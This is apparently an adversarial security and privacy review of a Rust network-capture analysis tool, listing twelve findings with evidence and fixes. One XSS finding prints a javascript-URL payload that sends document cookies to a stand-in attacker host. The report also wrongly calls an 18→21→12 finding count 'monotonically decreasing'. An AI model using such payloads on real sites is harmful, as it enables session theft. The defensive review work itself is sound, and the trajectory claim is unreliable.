# Adversarial Review — ADV-P3 (Implementation)

**Cycle:** v0.4.0-feature
**Pass:** 3
**Target:** implementation
**Scope:** `--scope=full`
**Develop tip reviewed:** `2ac8f2e` (post-F-ADV-P2-001..009/014/015 fix burst, PR #100)
**Date:** 2026-05-26
**Adversary:** vsdd-factory:adversary (fresh context — no prior reviews, tech-debt register, or fix-burst commit messages read)

## Pass Summary

- **Total findings:** 12 (+ 6 observations)
- **By severity:** **CRITICAL=1**, HIGH=6, MEDIUM=5, LOW=0
- **By category:** Privacy=5, Security=1, Correctness=3, Policy/Process=3
- **Confidence high-watermark:** 9 HIGH-confidence findings
- **Policy compliance:** 10/12 (POL-11 fails on `mutants.yml`; POL-12 runtime audit-log leak)
- **Novelty:** MIXED — 7 NEW findings, 2 partial-fix observations, 3 duplicates of still-OPEN
- **Trajectory:** **18 → 21 → 12 (DECREASING by 9)** — iron-law regression check ✅
- **Recommendation:** FIX-AND-RERUN

## Trajectory analysis (post-F-ADV-P2-001..015 fix burst)

| Category | Count | IDs |
|---|---:|---|
| NEW | 7 | F-ADV-P3-001 (CRITICAL — scrub gap), 002, 004, 005, 007, 008, 011 |
| Partial-fix (F-ADV-P2 fix incomplete) | 2 | F-ADV-P3-003 (scheme-whitespace bypass of F-ADV-P2-001), F-ADV-P3-006 (hash4 too narrow in F-ADV-P2-002) |
| Duplicates of still-OPEN findings | 3 | F-ADV-P3-009 (≈F-ADV-P1-019 Windows), F-ADV-P3-010 (≈F-ADV-P1-015 audit path), F-ADV-P3-012 (≈F-ADV-P1-008 disjoint-maps) |

**Root-cause check:** the F-ADV-P2 fix burst did NOT introduce new defects. Two of its fixes (F-ADV-P2-001 URL stripping; F-ADV-P2-002 hash-label fallback) are incomplete — adversary correctly identified WHATWG URL whitespace-evasion and weak 16-bit hash strength.

---

## CRITICAL (1)

### F-ADV-P3-001: `run_scrub` writes scrubbed output to disk WITHOUT calling the leak detector — asymmetric with `analyze --ai` and `diff`

**Severity:** CRITICAL
**Category:** Privacy
**Files:** `src/cli.rs:453-517` (specifically 496-506)

**Evidence:**
```rust
// run_scrub — NO ensure_clean / ensure_no_map_values
let md = scrub_text(&raw_md, &map);
std::fs::write(&args.output, md).map_err(...)?;
```

vs `run_diff` (cli.rs:358-360):
```rust
crate::ai::leak_detector::ensure_clean(&content)?;
crate::ai::leak_detector::ensure_no_map_values(&content, &base_map)?;
crate::ai::leak_detector::ensure_no_map_values(&content, &curr_map)?;
```

vs `run_analyze --ai` (cli.rs:641-642):
```rust
leak_detector::ensure_clean(&scrubbed_md)?;
leak_detector::ensure_no_map_values(&scrubbed_md, &map)?;
```

**Why it's a finding:** The `scrub` subcommand is the manual "AI-safe" path for users who paste output into Claude.ai/ChatGPT/Ollama. Both `analyze --ai` and `diff` apply the fail-closed leak gates before writing output. `run_scrub` does NOT. If `scrub_text` misses anything (a value introduced by a renderer change, a hostname with whitespace), the user gets a markdown file with real IPs and the architecture's load-bearing privacy claim silently fails on the bytes most likely to be pasted into an AI provider.

**Suggested remediation:** Add the two checks immediately after `scrub_text` and before either write in `run_scrub`. Add a regression test asserting `OtError::PrivacyLeak` on a fixture where scrub_text would miss a value.

**Confidence:** HIGH

---

## HIGH (6)

### F-ADV-P3-002: `report_md.rs` Top-flows table embeds raw IPs — robust by accidental ordering, not by construction

**Severity:** HIGH
**Category:** Privacy / Correctness
**Files:** `src/report_md.rs:170-191`

Flow `src`/`dst` IPs are interpolated unconditionally into the markdown. `scrub_text` only replaces values present in the map. If a future refactor populates `obs.flows` with a key whose IP isn't also in `obs.hosts`, the raw IP renders unscrubbed.

**Suggested remediation:** Add a `debug_assert!` in `build_map` that all flow-key IPs are in the map. Combined with F-ADV-P3-001's fail-closed gate, this becomes a real check.

**Confidence:** MEDIUM

---

### F-ADV-P3-003: `html_render::url_is_unsafe` does NOT strip embedded ASCII whitespace inside the scheme — `java\tscript:` bypasses

**Severity:** HIGH
**Category:** Security / XSS
**Files:** `src/ai/html_render.rs:26-35`
**Note:** Partial-fix observation against F-ADV-P2-001. My fix only handled leading whitespace; WHATWG URL spec §4.4.3 removes embedded tab/LF/CR before scheme parsing.

**Evidence:**
```rust
fn url_is_unsafe(url: &str) -> bool {
    let trimmed = url.trim_start();  // only strips LEADING whitespace
    UNSAFE_SCHEMES.iter().any(|scheme| {
        trimmed.len() >= scheme.len() && trimmed[..scheme.len()].eq_ignore_ascii_case(scheme)
    })
}
```

**Why it's a finding:** `[click](java\tscript:fetch('//attacker.com'+document.cookie))` produces a clickable `href="java\tscript:..."` that the filter doesn't recognize but every modern browser DOES execute (because the URL parser strips the tab first).

**Suggested remediation:**
```rust
let normalised: String = url.chars()
    .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
    .collect();
```
Add regression tests for `java\tscript:`, `j\navascript:`, `javasc\rript:`.

**Confidence:** HIGH

---

### F-ADV-P3-004: `scrub_text` substring shadowing when real value is a prefix of a pseudonym; fuzz harness explicitly excludes the case

**Severity:** HIGH
**Category:** Privacy / Correctness
**Files:** `src/scrub.rs:332-346`, `fuzz/fuzz_targets/scrub_text.rs:87-97`

If a real DHCP hostname is `"host"` or `"01"` (operator-controlled), every emitted pseudonym `host_NNN` contains it as a prefix. After the longest-first substitution, the secondary `"host"`→`"name_NNN"` pass would corrupt every pseudonym. The fuzz harness skips this case with a comment claiming "production build_map flow would never produce" such a map — but DHCP hostnames are user-controlled and could be `"host"` verbatim.

**Suggested remediation:** In `build_map`, validate that no name equals any pseudonym prefix. Or rewrite `scrub_text` to do single-pass longest-match replacement (Aho-Corasick).

**Confidence:** HIGH

---

### F-ADV-P3-005: `ScrubMap::validate` accepts pseudonyms that don't match the canonical `(host|mac|name)_NNN` shape

**Severity:** HIGH
**Category:** Privacy / Correctness
**Files:** `src/scrub.rs:63-104`, `src/scrub.rs:379-389`

A user-supplied baseline with `"FOOBAR": "10.0.0.1"` in the `ips` family passes `validate()`. `scrub_text` will substitute `FOOBAR` for `10.0.0.1`. `unscrub_text`'s regex `\b(?:host|mac|name)_[0-9]+\b` doesn't recognize `FOOBAR` — so even `--strict` won't catch the pseudonym (it's never extracted as one).

**Suggested remediation:** In `validate()`, require keys match `^(host|mac|name)_[0-9]+$`. Reject otherwise.

**Confidence:** HIGH

---

### F-ADV-P3-006: `diff` `unmapped_<hash4>` labels have only 16 bits of entropy — trivially brute-forceable against any small candidate space

**Severity:** HIGH
**Category:** Privacy
**Files:** `src/diff.rs:678-684`
**Note:** Partial-fix observation against F-ADV-P2-002. My helper used only 4 hex chars (2 bytes = 65536 values). A /24 candidate space (256 IPs) is recoverable in O(n) by computing SHA-256 for each.

**Suggested remediation:** Use ≥8 hex chars (32 bits) + per-run random salt mixed into the hash. Document the strength. Alternative: fail-closed when an unmapped IP is encountered (production contract is that the map should be complete).

**Confidence:** MEDIUM

---

### F-ADV-P3-007: `mutants.yml` does not fail CI on kill-rate regression — POL-11 false-green

**Severity:** HIGH
**Category:** Policy-11
**Files:** `.github/workflows/mutants.yml:36-94`

The workflow writes "Baseline: 84.1% ... A drop > 5% below baseline is a soft signal for review" to step summary, but never `exit 1` when `KILL_PCT < 79.1`. The job always passes regardless of kill rate. POL-11 explicitly targets this anti-pattern.

**Suggested remediation:**
```bash
if python3 -c "import sys; sys.exit(0 if $KILL_PCT >= 79.1 else 1)"; then
  echo "Check passed: kill rate ${KILL_PCT}% (>= 79.1%)"
else
  echo "::error::kill rate ${KILL_PCT}% below threshold"
  exit 1
fi
```

**Confidence:** HIGH

---

## MEDIUM (5)

### F-ADV-P3-008: `kani.yml` runs only on weekly cron + dispatch — Kani proofs not gated on PR

**Files:** `.github/workflows/kani.yml:1-7`

The composed privacy invariant proof is the central correctness argument for the privacy contract, but a PR that breaks an underlying model could land on develop and sit there for up to 7 days before detection.

**Suggested remediation:** Add `pull_request:` with a path filter for `src/scrub.rs`, `src/ai/leak_detector.rs`, `src/diff.rs`, `src/ai/html_render.rs`, `src/kani_proofs.rs`. Heavy proofs run only when those files change.

**Confidence:** HIGH

---

### F-ADV-P3-009: `which_claude()` checks `is_file()` but not executability

**Files:** `src/ai/claude_cli.rs:248-258`
**Note:** Related to F-ADV-P1-019 (Windows .exe) but a different bug — Unix executable bit not checked.

**Suggested remediation:**
```rust
use std::os::unix::fs::PermissionsExt;
if candidate.is_file() && std::fs::metadata(&candidate)
    .map(|m| m.permissions().mode() & 0o111 != 0).unwrap_or(false) {
    return Some(candidate);
}
```

**Confidence:** HIGH

---

### F-ADV-P3-010: `audit::AuditLog.input_pcap.path` records full filesystem path — same defect as F-ADV-P2-009 but on a different code path

**Files:** `src/cli.rs:767-771`, `src/audit.rs:46-51`
**Note:** Same defect class as F-ADV-P1-015 (still OPEN). F-ADV-P2-009 fixed the rendered-markdown path; the audit log was not updated.

**Suggested remediation:** Record only basename + SHA-256 (already present); drop the full path.

**Confidence:** HIGH

---

### F-ADV-P3-011: `parse::s7comm` doesn't bound `cotp_len_byte` — implausible COTP lengths accepted

**Files:** `src/parse/s7comm.rs:75-83`

A malformed packet with `cotp_len_byte = 255` passes the bounds check (`payload.len() >= s7_offset + 10` with s7_offset = 260). Per RFC 905, COTP class-0 header max is ~6 bytes. Accepting 255 gives a malicious packet 248 bytes of free space to position a synthetic `0x32` "S7 protocol ID" anywhere.

**Suggested remediation:** `if cotp_len_byte > 17 { return None; }`

**Confidence:** MEDIUM

---

### F-ADV-P3-012: `diff::compute` EC-002 warning suppressed when either map is empty

**Files:** `src/diff.rs:330-342`
**Note:** Related to F-ADV-P1-008. The `!base_pseudo_set.is_empty() && !curr_pseudo_set.is_empty()` short-circuit silences the warning for empty maps — a much more plausible bug than non-empty disjoint maps.

**Suggested remediation:** Separate warning for empty map: `"<side> map has no IP pseudonyms — was scrub skipped?"`.

**Confidence:** MEDIUM

---

## Observations (6)

- **O-ADV-P3-001:** `fuzz.yml` "Seed corpus" step is a no-op echo; no positive-coverage assertion of seed count.
- **O-ADV-P3-002:** MSRV check doesn't pin Cargo.lock — transitive-dep drift could change behavior between runs.
- **O-ADV-P3-003:** `prompt-evals.yml` was not opened in this pass.
- **O-ADV-P3-004:** `merge_map` EC-002 `panic!` is an attacker-controllable DoS if `validate()` is lax (F-ADV-P3-005).
- **O-ADV-P3-005:** `diff::compute` calls `inventory::build` twice per invocation — perf optimization for GB-scale diffs.
- **O-ADV-P3-006:** `parse::dnp3::is_engineering_class` negative-class coverage is narrow.

## Convergence assessment

Per the skill's Iron Law: minimum 3 clean passes for convergence. P3 is NOT clean (1 CRITICAL + 6 HIGH). The trajectory is monotonically decreasing (18→21→12) which is the right direction, but we need:

1. **One more fix burst** to close the 1 CRITICAL + at minimum the 5 HIGH-confidence HIGH findings (F-ADV-P3-001, 003, 004, 005, 007). F-ADV-P3-006 (hash-strength) should also be addressed since it's a partial-fix obs.
2. **ADV-P4** against the post-fix tip to verify trajectory continues decreasing and no new defects introduced.
3. **ADV-P5** if P4 still has CRITICAL or HIGH findings (or run if P4 is clean — minimum 3 CLEAN passes still requires more clean passes).

The realistic convergence horizon is 2-3 more rounds. The 13 still-open MEDIUM/LOW findings from P1+P2+P3 can be triaged into a separate "tech-debt sweep" PR rather than blocking convergence.
